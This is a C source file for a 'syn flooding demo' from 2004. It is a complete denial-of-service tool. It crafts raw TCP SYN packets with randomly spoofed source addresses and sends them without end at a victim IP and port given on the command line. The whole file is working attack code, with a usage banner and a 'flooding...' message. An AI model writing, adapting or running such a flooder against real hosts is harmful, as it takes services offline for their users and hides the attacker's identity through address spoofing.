
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>

int tcpsend(u_int saddr, u_int daddr, unsigned short sport,
		 unsigned short dport, char *data,
		 unsigned short datalen);
unsigned short in_cksum(unsigned short *ptr, int nbytes);
void help(void);

//#define WINDOWS

#ifdef WINDOWS

typedef unsigned char __u8;
typedef unsigned short int __u16;
typedef unsigned int __u32;

#pragma packing(byte, 1)

struct tcphdr {
        __u16   source;
        __u16   dest;
        __u32   seq;
        __u32   ack_seq;
		union {
        __u16   doff:4,
                res1:4,
                cwr:1,
                ece:1,
                urg:1,
                ack:1,
                psh:1,
                rst:1,
                syn:1,
                fin:1;
		__u32	flags;
		};
        __u16   window;
        __u16   check;
        __u16   urg_ptr;
};

struct iphdr {
		__u8 	version:4,
				ihl:4;
        __u8 	tos;
        __u16   tot_len;
        __u16 	id;
        __u16   frag_off;
        __u8 	ttl;
        __u8 	protocol;
        __u16   check;
        __u32   saddr;
        __u32   daddr;
};

#endif // WINDOWS

struct pseudohdr
{
	unsigned long saddr;
	unsigned long daddr;
	char useless;
	unsigned char protocol;
	unsigned short length;
};

unsigned long sent = 0;

int main(int argc, char **argv)
{
	if (argc < 3) {
		help();
		exit(0);
	}

#ifdef WINDOWS

WORD wVersionRequested;
WSADATA wsaData;
int err;
 
wVersionRequested = MAKEWORD(2, 2);
 
err = WSAStartup(wVersionRequested, &wsaData);
	
if ( err != 0 )
    return (-1);

if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
    WSACleanup();
    return (-1); 
}

	srand(time(0));
#else
	srand(getpid());
#endif // WINDOWS
	srand(1001);
	unsigned long victim;
	unsigned short destport;
	
	victim = inet_addr(argv[1]);
	destport = atoi(argv[2]);

	printf("flooding...\n");
	
	char ip[15] = { 0 };
	int nbytes;
	char *payload = (argc > 3) ? argv[3] : 0;
	unsigned short payload_len = payload ? strlen(payload) : 0;
	
	while (true) {	
		sprintf(ip, "%d.%d.%d.%d\n", rand() % 223, rand() % 255, rand() % 255, rand() % 255);
		nbytes = tcpsend(inet_addr(ip), victim, rand() % 255 + 2003, destport, payload, payload_len);
		if (!nbytes) {
			printf("send error (%d packets have been sent)\n", sent);
#ifdef WINDOWS
			printf("error num: %i (%d packets have been sent)\n", WSAGetLastError(), sent);
#endif // WINDOWS
			exit(-1);
		}
		++sent;
	}
	return (0);
}

int tcpsend (unsigned int saddr, unsigned int daddr, unsigned short sport, 
	unsigned short dport, char *data, unsigned short datalen)
{
	char *packet;
	struct iphdr *ip;
	struct tcphdr *tcp;
	struct pseudohdr *pseudo;
	struct sockaddr_in servaddr;
	int retval, sockfd;
	int on = 1;
	int packet_size = (sizeof (struct iphdr) +
				   sizeof (struct tcphdr) +
				   datalen) * sizeof (char);

	packet = (char *) malloc (packet_size);

	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons (dport);
	servaddr.sin_addr.s_addr = daddr;
	memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sockfd < 0) {
		perror("socket");
		return (0);
	}
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) {
		perror("setsockopt");
		return (0);
	}

	ip = (struct iphdr *) packet;
	tcp = (struct tcphdr *) (packet + sizeof (struct iphdr));
	pseudo = (struct pseudohdr *) (packet + sizeof (struct iphdr) -
				       sizeof (struct pseudohdr));

	memset (packet, 0, packet_size);

	pseudo->saddr = saddr;
	pseudo->daddr = daddr;
	pseudo->protocol = IPPROTO_TCP;
	pseudo->length = htons (sizeof (struct tcphdr));

	tcp->source = htons (sport);
	tcp->dest = htons (dport);
	tcp->seq = htonl(0x020405B4);
	tcp->ack_seq = 0;
	tcp->doff = 5;
	tcp->syn = 1;
	tcp->window = htons (0xD0F1);
	tcp->check =
		in_cksum ((unsigned short *) pseudo,
			  sizeof (struct tcphdr) + sizeof (struct pseudohdr));

	ip->version = 4;
	ip->ihl = 5;
	ip->tot_len = htons (packet_size);
	ip->id = rand ();
	ip->ttl = 255;
	ip->protocol = IPPROTO_TCP;
	ip->saddr = saddr;
	ip->daddr = daddr;
	ip->check = in_cksum ((unsigned short *) ip, sizeof (struct iphdr));

	if ((retval = sendto (sockfd, packet, packet_size, 0,
			      (const sockaddr*) &servaddr, sizeof (servaddr))) == -1)
		return (0);

#ifdef WINDOWS
	closesocket (sockfd);
#else
	close(sockfd);
#endif // WINDOWS

	// free(packet);
	return (retval);
}

unsigned short in_cksum (unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;

	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}

	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) & oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return (answer);
}

void help ()
{
	puts("syn flooding demo v0.1");
	puts("(c) 2004 by Lukasz Tomicki <tomicki@o2.pl>");
	puts("  usage: syn [destination IP] [destination port]");
}
